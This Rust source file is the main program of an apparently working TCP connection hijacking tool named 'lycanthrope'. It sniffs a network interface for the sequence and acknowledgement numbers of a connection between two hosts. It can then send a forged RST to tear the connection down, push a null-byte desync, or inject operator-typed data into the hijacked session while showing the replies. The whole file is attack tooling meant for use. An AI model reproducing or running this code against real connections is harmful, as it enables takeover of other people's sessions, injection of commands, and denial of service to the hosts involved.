use clap::Parser;
use lycanthrope::args::Args;
use lycanthrope::errors::*;
use lycanthrope::net::packet::{PacketDirection, ParsedPacket, TcpFlagSet};
use lycanthrope::net::{self, Connection, Injector};
use lycanthrope::tui as lyc_tui;
use tokio::io::{self, AsyncBufReadExt, BufReader};
use tokio::sync::mpsc;

const BANNER: &str = r#"
    ██╗      ██╗   ██╗ ██████╗ █████╗ ███╗   ██╗████████╗██╗  ██╗██████╗  ██████╗ ██████╗ ███████╗
    ██║      ██║   ██║██╔════╝██╔══██╗████╗  ██║╚══██╔══╝██║  ██║██╔══██╗██╔═══██╗██╔══██╗██╔════╝
    ██║      ██║   ██║██║     ███████║██╔██╗ ██║   ██║   ███████║██████╔╝██║   ██║██████╔╝█████╗  
    ██║      ██║   ██║██║     ██╔══██║██║╚██╗██║   ██║   ██╔══██║██╔══██╗██║   ██║██╔═══╝ ██╔══╝  
    ███████╗ ╚██████╔╝╚██████╗██║  ██║██║ ╚████║   ██║   ██║  ██║██║  ██║╚██████╔╝██║     ███████╗

                            TCP Connection Hijacker
"#;

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let args = Args::parse();

    if !args.tui {
        let level = match args.quiet {
            0 => tracing::Level::DEBUG,
            1 => tracing::Level::INFO,
            _ => tracing::Level::WARN,
        };
        tracing_subscriber::fmt().with_max_level(level).with_writer(std::io::stderr).init();
    }

    if !args.tui {
        eprintln!("{}", BANNER);
    }

    eprintln!("[*] Waiting for SEQ/ACK...");
    eprintln!("[*] (Generate traffic between src<->dst to speed up)\n");

    let connection = if let (Some(seq), Some(ack)) = (args.seq, args.ack) {
        eprintln!("[+] Using provided SEQ=0x{:x} ACK=0x{:x}", seq, ack);
        Connection::new(args.src, args.dst, seq, ack)
    } else {
        let c = net::get_seq_ack(args.interface.clone(),args.src,args.dst).await?;
        eprintln!("[+] Got SEQ=0x{:x} ACK=0x{:x}", c.get_seq().await, c.get_ack().await);
        eprintln!("[+] Connection: {} → {}", c.src, c.dst);
        c
    };

    let injector = Injector::new(connection.clone())?;

    if args.reset {
        injector.reset().await?;
        eprintln!("[+] RST sent. Connection reset.");
        return Ok(());
    }

    if args.send_null {
        eprintln!("[*] Sending 1KB null desync...");
        injector.desync().await?;
        eprintln!("[+] Desync done.");
    }

    let (pkt_tx, pkt_rx) = mpsc::channel::<ParsedPacket>(256);

    {
        let interface = args.interface.clone();
        let injector_conn = connection.clone();
        let pkt_tx = pkt_tx.clone();
        let recv_src = connection.dst;
        let recv_dst = connection.src;

        tokio::spawn(async move {
            if let Err(e) = run_receiver(&interface,recv_src,recv_dst,injector_conn,pkt_tx).await {
                error!("Receiver error: {}", e);
            }
        });
    }

    if args.tui {
        run_tui_mode(injector, pkt_rx).await
    } else {
        run_headless_mode(injector, pkt_rx).await
    }
}

async fn run_headless_mode(injector: Injector,mut pkt_rx: mpsc::Receiver<ParsedPacket>) -> anyhow::Result<()> {
    eprintln!("[*] Hijack session started. ^D to exit.");
    eprintln!("[*] Everything you type is sent to the hijacked connection.\n");

    tokio::spawn(async move {
        let mut stdout = tokio::io::stdout();
        while let Some(pkt) = pkt_rx.recv().await {
            if !pkt.payload.is_empty() {
                use tokio::io::AsyncWriteExt;
                let _ = stdout.write_all(&pkt.payload).await;
                let _ = stdout.flush().await;
            }
        }
    });

    let stdin = io::stdin();
    let reader = BufReader::new(stdin);
    let mut lines = reader.lines();

    while let Ok(Some(line)) = lines.next_line().await {
        let data = format!("{}\n", line);
        injector.inject_data(data.as_bytes()).await?;
    }
    injector.finish().await?;
    eprintln!("\n[*] FIN sent. Exiting.");
    Ok(())
}

async fn run_tui_mode(injector: Injector, pkt_rx: mpsc::Receiver<ParsedPacket>) -> anyhow::Result<()> {
    lyc_tui::run_tui(&injector, pkt_rx).await?;
    injector.finish().await?;
    eprintln!("[*] Session ended.");
    Ok(())
}

async fn run_receiver(interface: &str,src: std::net::SocketAddr,dst: std::net::SocketAddr, connection: Connection,pkt_tx: mpsc::Sender<ParsedPacket>) -> anyhow::Result<()> {
    use pnet::datalink::{self, Channel::Ethernet, NetworkInterface};
    use pktparse::{ethernet, ipv4, tcp};
    use pktparse::ip::IPProtocol;
    use std::net::IpAddr;

    let interfaces = datalink::interfaces();
    let iface = interfaces.into_iter().find(|i: &NetworkInterface| i.name == interface).context("Interface not found for receiver")?;

    let (_, mut rx) = match datalink::channel(&iface, Default::default()) {
        Ok(Ethernet(_tx, rx)) => (_tx, rx),
        Ok(_) => bail!("Unhandled channel type"),
        Err(e) => bail!("Datalink error: {}", e),
    };

    while let Ok(packet) = rx.next() {
        if let Ok((remaining, eth)) = ethernet::parse_ethernet_frame(packet) {
            if eth.ethertype != ethernet::EtherType::IPv4 {
                continue;
            }
            if let Ok((remaining, ip_hdr)) = ipv4::parse_ipv4_header(remaining) {
                let pkt_src: IpAddr = ip_hdr.source_addr.into();
                let pkt_dst: IpAddr = ip_hdr.dest_addr.into();

                if pkt_src != src.ip() || pkt_dst != dst.ip() {
                    continue;
                }
                if ip_hdr.protocol != IPProtocol::TCP {
                    continue;
                }
                if let Ok((remaining, tcp_hdr)) = tcp::parse_tcp_header(remaining) {
                    if tcp_hdr.source_port != src.port() || tcp_hdr.dest_port != dst.port() {
                        continue;
                    }

                    if !tcp_hdr.flag_psh && remaining.is_empty() {
                        continue;
                    }

                    if connection.is_duplicate(tcp_hdr.sequence_no, remaining.len() as u32).await {
                        continue;
                    }

                    let new_ack = tcp_hdr.sequence_no + remaining.len() as u32;
                    connection.set_ack(new_ack).await;

                    let parsed = ParsedPacket::new(
                        std::net::SocketAddr::new(pkt_src, tcp_hdr.source_port),
                        std::net::SocketAddr::new(pkt_dst, tcp_hdr.dest_port),
                        tcp_hdr.sequence_no,
                        tcp_hdr.ack_no,
                        TcpFlagSet {
                            syn: tcp_hdr.flag_syn,
                            ack: tcp_hdr.flag_ack,
                            fin: tcp_hdr.flag_fin,
                            rst: tcp_hdr.flag_rst,
                            psh: tcp_hdr.flag_psh,
                            urg: tcp_hdr.flag_urg,
                        },
                        remaining.to_vec(),
                        PacketDirection::Incoming,
                    );

                    if pkt_tx.send(parsed).await.is_err() {
                        break;
                    }
                }
            }
        }
    }

    Ok(())
}